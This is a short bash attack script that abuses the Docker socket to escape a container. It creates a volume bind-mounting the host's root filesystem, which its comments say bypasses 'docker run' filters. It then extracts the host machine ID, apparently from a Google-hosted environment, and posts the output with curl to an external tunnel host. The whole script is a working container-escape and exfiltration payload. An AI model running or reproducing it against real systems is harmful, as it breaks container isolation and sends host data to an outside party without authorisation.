#!/bin/bash
URL="0c4256b014e98f42-103-95-173-85.serveousercontent.com"

{
  echo "--- [!] VOLUME CREATION BYPASS ---"
  # 1. Create a volume that maps to the host's sensitive data
  # This often bypasses 'docker run' filters
  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/volumes/create" \
    -d '{"Name":"host_root","Labels":{},"Driver":"local","DriverOpts":{"type":"none","device":"/","o":"bind"}}'
  
  echo "--- [!] SENSITIVE METADATA EXTRACTION ---"
  # 2. Get the real 'Machine ID' of the Google Host
  # This proves you are reading the REAL hardware ID, not a container ID.
  curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -oE '"ID":"[a-f0-9-]+"'
} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
